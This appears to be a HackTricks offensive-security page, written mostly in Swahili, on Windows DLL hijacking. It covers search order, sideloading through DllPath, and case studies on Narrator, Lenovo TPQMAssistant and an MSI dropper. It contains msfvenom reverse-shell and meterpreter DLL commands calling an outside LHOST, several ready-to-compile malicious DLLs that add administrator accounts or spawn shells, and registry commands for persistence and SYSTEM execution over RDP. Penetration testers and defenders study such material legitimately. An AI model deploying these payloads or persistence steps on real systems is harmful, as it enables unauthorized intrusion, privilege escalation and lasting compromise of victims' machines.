# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Taarifa za Msingi

DLL Hijacking inahusisha kudanganya programu iliyoaminika ili ipakue DLL hatarishi. Neno hili linajumuisha mbinu kadhaa kama **DLL Spoofing, Injection, and Side-Loading**. Inatumika hasa kwa code execution, achieving persistence, na, kwa nadra, privilege escalation. Licha ya mkazo juu ya escalation hapa, njia ya hijacking inabaki ile ile kwa malengo yote.

### Mbinu Za Kawaida

Mbinu kadhaa zinatumiwa kwa DLL hijacking, kila moja ikiwa na ufanisi kulingana na mkakati wa programu wa kupakia DLL:

1. **DLL Replacement**: Kubadilisha DLL halali na moja hatarishi, kwa hiari kutumia DLL Proxying ili kuhifadhi utendaji wa DLL ya asili.
2. **DLL Search Order Hijacking**: Kuweka DLL hatarishi katika njia ya utafutaji kabla ya ile halali, ukitumia muundo wa utafutaji wa programu.
3. **Phantom DLL Hijacking**: Kuunda DLL hatarishi ambayo programu itapakia, ikidhani ni DLL inayohitajika lakini haipo.
4. **DLL Redirection**: Kurekebisha parameta za utafutaji kama `%PATH%` au faili `.exe.manifest` / `.exe.local` ili kuelekeza programu kwenye DLL hatarishi.
5. **WinSxS DLL Replacement**: Kubadilisha DLL halali na tolewa hatarishi katika saraka ya WinSxS, njia inayohusiana mara nyingi na DLL side-loading.
6. **Relative Path DLL Hijacking**: Kuweka DLL hatarishi katika saraka inayodhibitiwa na mtumiaji pamoja na programu iliyokopianwa, ikifanana na Binary Proxy Execution techniques.

> [!TIP]
> Kwa mlolongo wa hatua kwa hatua unaoweka HTML staging, AES-CTR configs, na .NET implants juu ya DLL sideloading, angalia workflow hapa chini.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Kupata Dll zilizokosekana

Njia ya kawaida zaidi ya kupata Dll zilizokosekana ndani ya mfumo ni kuendesha [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) kutoka sysinternals, **kutengeneza** **vichujio vifuatavyo 2**:

![](<../../../images/image (961).png>)

![](<../../../images/image (230).png>)

na onyesha tu **File System Activity**:

![](<../../../images/image (153).png>)

Ikiwa unatafuta **missing dlls in general** uiachi hii ikimbie kwa **sekunde** chache.  
Ikiwa unatafuta **missing dll inside an specific executable**, unapaswa kuweka **kichujio kingine kama "Process Name" "contains" `<exec name>`, kuendesha executable, na kusimamisha kunasa matukio**.

## Kutumia Dll Zilizokosekana

Ili kufanya privilege escalation, nafasi yetu bora ni kuwa na uwezo wa **kuandika dll ambayo process yenye privilege itajaribu kupakia** katika baadhi ya **mahali ambapo itatafutwa**. Kwa hiyo, tunaweza **kuandika** dll katika **folda** ambako **dll inatafutwa kabla** ya folda ambapo **dll ya asili** iko (hali isiyo ya kawaida), au tunaweza **kuandika katika folda fulani ambako dll itatafutwa** na dll ya asili **haitoenei** kwenye folda yoyote.

### Dll Search Order

**Inside the** [**Microsoft documentation**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **you can find how the Dlls are loaded specifically.**

**Windows applications** zinatafuta DLL kwa kufuata seti ya **pre-defined search paths**, zikifuata mlolongo fulani. Tatizo la DLL hijacking linapotokea ni pale DLL hatarishi inapowekwa kimkakati katika moja ya saraka hizi, kuhakikisha inapakuliwa kabla ya DLL halisi. Suluhisho la kuzuia hili ni kuhakikisha programu inatumia absolute paths inaporejea kwa DLL zinazohitajika.

Unaweza kuona **DLL search order on 32-bit** systems hapa chini:

1. The directory from which the application loaded.
2. The system directory. Use the [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) function to get the path of this directory.(_C:\Windows\System32_)
3. The 16-bit system directory. There is no function that obtains the path of this directory, but it is searched. (_C:\Windows\System_)
4. The Windows directory. Use the [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) function to get the path of this directory.
1. (_C:\Windows_)
5. The current directory.
6. The directories that are listed in the PATH environment variable. Note that this does not include the per-application path specified by the **App Paths** registry key. The **App Paths** key is not used when computing the DLL search path.

Huo ndiyo **default** search order ukiwa na **SafeDllSearchMode** umewezeshwa. Wakati umezimwa saraka ya sasa inapaa hadi nafasi ya pili. Ili kuzima kipengele hiki, tengeneza thamani ya rejista **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** na uiweke kuwa 0 (chaguo-msingi ni kuwezeshwa).

Ikiwa [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) function inaitwa na **LOAD_WITH_ALTERED_SEARCH_PATH** utafutaji huanza katika saraka ya module ya executable ambayo **LoadLibraryEx** inapakia.

Mwishowe, kumbuka kuwa **dll inaweza kupakiwa ikielezwa absolute path badala ya jina pekee**. Katika kesi hiyo dll hiyo **itatafutwa tu katika path hiyo** (ikiwa dll ina dependencies, zitatafutwa kama zilivyopakiwa kwa jina).

Kuna njia nyingine za kubadilisha mpangilio wa utafutaji lakini sitaziweka hapa.

### Forcing sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath

Njia iliyosasishwa ya kuathiri kwa uhakika njia ya utafutaji wa DLL ya mchakato mpya iliyoundwa ni kuweka shamba la DllPath katika RTL_USER_PROCESS_PARAMETERS wakati wa kuunda mchakato kwa kutumia native APIs za ntdll. Kwa kutoa saraka inayodhibitiwa na mshambuliaji hapa, mchakato lengwa ambao unatatua DLL iliyoongezwa kwa jina (bila absolute path na bila kutumia safe loading flags) unaweza kulazimishwa kupakia DLL hatarishi kutoka saraka hiyo.

Wazo kuu
- Jenga vigezo vya mchakato kwa RtlCreateProcessParametersEx na utoe DllPath maalum inayowelekeza kwenye folda yako inayodhibitiwa (kwa mfano, saraka ambapo dropper/unpacker yako iko).
- Unda mchakato kwa RtlCreateUserProcess. Wakati binary lengwa itatatua DLL kwa jina, loader itahitaji DllPath uliotolewa wakati wa utatuzi, kuruhusu sideloading hakika hata DLL hatarishi haiko pamoja na EXE lengwa.

Vidokezo/mipaka
- Hii inaathiri mchakato mtoto unaoundwa; ni tofauti na SetDllDirectory, ambayo inaathiri mchakato wa sasa pekee.
- Lengo lazima liingize au LoadLibrary DLL kwa jina (bila absolute path na bila kutumia LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs na absolute paths zenye hardcode haziwezi kuibiwa. Forwarded exports na SxS zinaweza kubadilisha umiliki.

Mfano mdogo wa C (ntdll, wide strings, simplified error handling):

<details>
<summary>Mfano kamili wa C: forcing DLL sideloading via RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Mfano wa matumizi ya uendeshaji
- Weka xmllite.dll yenye hatari (inayo-export kazi zinazohitajika au inayotumika kama proxy kwa ile halisi) kwenye saraka yako ya DllPath.
- Anzisha binary iliyosainiwa inayojulikana kutafuta xmllite.dll kwa jina kwa kutumia mbinu hapo juu. Loader inatatua import kupitia DllPath uliyopewa na itasideload DLL yako.

Teknique hii imeonekana in-the-wild kuendesha multi-stage sideloading chains: launcher wa awali huweka helper DLL, ambayo kisha huanzisha binary iliyosainiwa na Microsoft, hijackable, na yenye DllPath maalum ili kulazimisha upakiaji wa DLL ya mshambuliaji kutoka kwenye staging directory.


#### Exceptions on dll search order from Windows docs

Marejeleo fulani ya utofauti kwenye mpangilio wa kawaida wa utafutaji wa DLL yameripotiwa kwenye nyaraka za Windows:

- Wakati **DLL inayoshirikiana jina na ile tayari iliyopakiwa kwenye kumbukumbu** inapokumbana, mfumo hupita utafutaji wa kawaida. Badala yake, hufanya ukaguzi wa redirection na manifest kabla ya kurudi kwa DLL iliyopo kwenye kumbukumbu. **Katika tukio hili, mfumo haufanyi utafutaji wa DLL**.
- Katika kesi ambapo DLL inatambuliwa kama **known DLL** kwa toleo la Windows linalotumika, mfumo utatumia toleo lake la known DLL, pamoja na DLL zake zote tegemezi, **bila kufanya mchakato wa utafutaji**. Ufunguo wa rejista **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** unaorodhesha known DLLs hizi.
- Ikiwa **DLL ina dependencies**, utafutaji wa DLL hizo tegemezi unafanywa kana kwamba zilielezwa kwa majina tu ya **module**, bila kujali kama DLL ya awali ilitambuliwa kwa njia kamili ya path.

### Escalating Privileges

**Mahitaji**:

- Tambua mchakato unaofanya kazi au utakaofanya kazi chini ya **idhini tofauti** (horizontal au lateral movement), ambao **unakosa DLL**.
- Hakikisha kuna **write access** kwa saraka yoyote ambayo **DLL** itatafutwa. Mahali hapa inaweza kuwa saraka ya executable au saraka ndani ya system path.

Ndiyo, mahitaji haya ni magumu kuyapata kwa sababu kwa default ni adimu kupata executable yenye mamlaka ikikosa dll na ni hata ajabu zaidi kuwa na write permissions kwenye folda ya system path (huwezi kwa default). Lakini, katika mazingira yaliyopangwa vibaya hili linawezekana.\
Iwapo una bahati na unakidhi mahitaji, unaweza kukagua mradi wa [UACME](https://github.com/hfiref0x/UACME). Hata ikiwa **lengo kuu la mradi ni bypass UAC**, unaweza kupata huko **PoC** ya Dll hijaking kwa toleo la Windows unalotumia (labda kwa kubadilisha tu path ya folda ambayo una write permissions).

Kumbuka kwamba unaweza **kuangalia ruhusa zako katika saraka** ukifanya:
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
Na **angalia ruhusa za folda zote ndani ya PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Unaweza pia kukagua imports za executable na exports za dll kwa:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Kwa mwongozo kamili kuhusu jinsi ya **kutumika mabaya Dll Hijacking kupandisha ruhusa** ikiwa una ruhusa za kuandika katika **System Path folder** angalia:

{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Zana za kiotomatiki

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) itatathmini ikiwa una ruhusa za kuandika kwenye folda yoyote ndani ya system PATH.\
Zana nyingine za kiotomatiki zinazovutia kugundua udhaifu huu ni **PowerSploit functions**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ na _Write-HijackDll._

### Mfano

Iwapo utapata mazingira yanayoweza kutumiwa, moja ya mambo muhimu zaidi kwa kutumia udhaifu huo kwa mafanikio ni **kuunda dll inayotoa angalau functions zote ambazo executable itazihitaji kutoka kwake**. Hata hivyo, kumbuka kwamba Dll Hijacking inafaa ili [kupandisha kutoka Medium Integrity level hadi High **(bypassing UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) au kutoka [**High Integrity to SYSTEM**](../index.html#from-high-integrity-to-system). Unaweza kupata mfano wa **jinsi ya kuunda dll halali** ndani ya utafiti huu wa dll hijacking ulioelekezwa kwenye dll hijacking kwa utekelezaji: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows).\
Zaidi ya hayo, katika sehemu inayofuata unaweza kupata baadhi ya **mifano ya msimbo wa dll** ambayo inaweza kuwa muhimu kama **templates** au kwa kuunda **dll yenye functions zisizohitajika zilizotolewa**.

## **Kuunda na Ku-compile Dlls**

### **Dll Proxifying**

Kwa msingi, **Dll proxy** ni Dll inayoweza **kutekeleza msimbo wako wa kibaya linapopakiwa** lakini pia **kuonyesha** na **kufanya kazi** kama inavyotarajiwa kwa **kupitisha simu zote kwa maktaba halisi**.

Kwa kutumia zana [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) au [**Spartacus**](https://github.com/Accenture/Spartacus) unaweza kuelezwa executable na kuchagua maktaba unayotaka ku-proxify na **kutengeneza dll iliyo-proxify** au **kuelezwa Dll** na **kutengeneza dll iliyo-proxify**.

### **Meterpreter**

**Pata rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Pata meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Unda mtumiaji (x86 sikuona toleo la x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Yako mwenyewe

Kumbuka kuwa katika baadhi ya matukio Dll unayoi-compile inapaswa **export several functions** ambazo zitatumiwa kupakiwa na mchakato wa victim; ikiwa functions hizi hazipo basi **binary won't be able to load** na **exploit will fail**.

<details>
<summary>C DLL template (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>C++ DLL mfano na uundaji wa mtumiaji</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Mbadala C DLL na thread entry</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Uchambuzi wa Kesi: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe bado huchunguza DLL ya localization inayotarajiwa, maalum kwa lugha, wakati wa kuanzishwa, ambayo inaweza kufinyangwa kwa arbitrary code execution na persistence.

Key facts
- Probe path (current builds): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (older builds): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- If a writable attacker-controlled DLL exists at the OneCore path, it is loaded and `DllMain(DLL_PROCESS_ATTACH)` executes. No exports are required.

Discovery with Procmon
- Kichujio: `Process Name is Narrator.exe` and `Operation is Load Image` or `CreateFile`.
- Anzisha Narrator na angalia jaribio la kupakia njia iliyotajwa hapo juu.

DLL ndogo
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC silence
- A naive hijack itasababisha Narrator kuzungumza/kuangazia UI. Ili kubaki kimya, unapo-attach, orodhesha threads za Narrator, fungua thread kuu (`OpenThread(THREAD_SUSPEND_RESUME)`) na `SuspendThread` it; endelea katika thread yako mwenyewe. Angalia PoC kwa msimbo kamili.

Trigger and persistence via Accessibility configuration
- User context (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Kwa yafuatayo, kuanzisha Narrator huchukua DLL iliyowekwa. Kwenye secure desktop (logon screen), bonyeza CTRL+WIN+ENTER kuanzisha Narrator.

RDP-triggered SYSTEM execution (lateral movement)
- Ruhusu classic RDP security layer: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Fanya RDP kwa host, kwenye logon screen bonyeza CTRL+WIN+ENTER kuanzisha Narrator; DLL yako inatekelezwa kama SYSTEM kwenye secure desktop.
- Utekelezaji unasimama wakati kikao cha RDP kinapofungwa—ingiza/migrate haraka.

Bring Your Own Accessibility (BYOA)
- Unaweza kunakili entry ya registry ya Accessibility Tool (AT) iliyojengwa kabla (mfano, CursorIndicator), uibadilishe ili kuelekeza kwenye binary/DLL yoyote, uiiweke (import), kisha weka `configuration` kwa jina la AT hilo. Hii inatoa proxy ya utekelezaji wowote chini ya Accessibility framework.

Notes
- Kuandika chini ya `%windir%\System32` na kubadili vigezo vya HKLM kunahitaji haki za admin.
- Mantiki yote ya payload inaweza kuwepo katika `DLL_PROCESS_ATTACH`; hakuna exports zinahitajika.

## Case Study: CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe

Mfano huu unaonyesha **Phantom DLL Hijacking** katika TrackPoint Quick Menu ya Lenovo (`TPQMAssistant.exe`), iliyofuatiliwa kama **CVE-2025-1729**.

### Maelezo ya Udhaifu

- **Komponenti**: `TPQMAssistant.exe` iko katika `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` inakimbia kila siku saa 9:30 AM chini ya muktadha wa mtumiaji aliyeingia.
- **Directory Permissions**: Inaweza kuandikwa na `CREATOR OWNER`, ikiruhusu watumiaji wa ndani kuweka faili yoyote.
- **DLL Search Behavior**: Inajaribu kuleta `hostfxr.dll` kutoka saraka yake ya kazi kwanza na inarekodi "NAME NOT FOUND" ikiwa haipo, ikionyesha upendeleo wa kutafuta kwenye saraka ya ndani.

### Exploit Implementation

Mshambuliaji anaweza kuweka stub ya hatari `hostfxr.dll` katika saraka hiyo hiyo, akitumia DLL iliyokosekana kupata utekelezaji wa msimbo chini ya muktadha wa mtumiaji:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Mtiririko wa Shambulio

1. Kama mtumiaji wa kawaida, weka `hostfxr.dll` kwenye `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Subiri kazi iliyopangwa ianze saa 9:30 AM chini ya muktadha wa mtumiaji wa sasa.
3. Ikiwa msimamizi ameingia wakati kazi inapoendesha, DLL ya uharibifu itaendeshwa katika kikao cha msimamizi kwa medium integrity.
4. Fuatilia mbinu za kawaida za UAC bypass ili kuinua kutoka medium integrity hadi vibali vya SYSTEM.

## Case Study: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Wanaoshambulia mara nyingi huunganisha droppers za MSI na DLL side-loading ili kutekeleza payloads chini ya mchakato uliothibitishwa na kusainiwa.

Chain overview
- Mtumiaji anapakua MSI. A CustomAction inafanya kazi kimya wakati wa usakinishaji wa GUI (mfano, LaunchApplication au hatua ya VBScript), ikijenga tena hatua inayofuata kutoka kwa rasilimali zilizojumuishwa.
- The dropper writes a legitimate, signed EXE and a malicious DLL to the same directory (example pair: Avast-signed wsc_proxy.exe + attacker-controlled wsc.dll).
- When the signed EXE is started, Windows DLL search order loads wsc.dll from the working directory first, executing attacker code under a signed parent (ATT&CK T1574.001).

MSI analysis (what to look for)
- CustomAction table:
- Look for entries that run executables or VBScript. Example suspicious pattern: LaunchApplication executing an embedded file in background.
- In Orca (Microsoft Orca.exe), inspect CustomAction, InstallExecuteSequence and Binary tables.
- Embedded/split payloads in the MSI CAB:
- Kutoa kwa usimamizi: msiexec /a package.msi /qb TARGETDIR=C:\out
- Or use lessmsi: lessmsi x package.msi C:\out
- Tafuta vipande vidogo vingi vinavyounganishwa na kufumbuliwa na VBScript CustomAction. Common flow:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktikali sideloading na wsc_proxy.exe
- Weka faili hizi mbili katika kabrasha moja:
- wsc_proxy.exe: host halali aliye saini (Avast). Mchakato unajaribu kupakia wsc.dll kwa jina kutoka katika saraka yake.
- wsc.dll: DLL ya mshambuliaji. Ikiwa exports maalum hazihitajiki, DllMain inaweza kutosha; vinginevyo, tunga proxy DLL na pitisha exports zinazohitajika kwa maktaba halisi huku ukiendesha payload ndani ya DllMain.
- Jenga payload ndogo ya DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- Kwa mahitaji ya export, tumia proxying framework (e.g., DLLirant/Spartacus) kuunda forwarding DLL ambayo pia inaendesha payload yako.

- Mbinu hii inategemea utatuzi wa jina la DLL na host binary. Ikiwa host inatumia absolute paths au safe loading flags (e.g., LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack inaweza kushindwa.
- KnownDLLs, SxS, na forwarded exports zinaweza kuathiri kipaumbele na zinapaswa kuzingatiwa wakati wa kuchagua host binary na export set.

## Marejeo

- [CVE-2025-1729 - Privilege Escalation Using TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [Microsoft Store - TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [Check Point Research – Nimbus Manticore Deploys New Malware Targeting Europe](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [TrustedSec – Hack-cessibility: When DLL Hijacks Meet Windows Helpers](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [Unit 42 – Digital Doppelgangers: Anatomy of Evolving Impersonation Campaigns Distributing Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)


{{#include ../../../banners/hacktricks-training.md}}
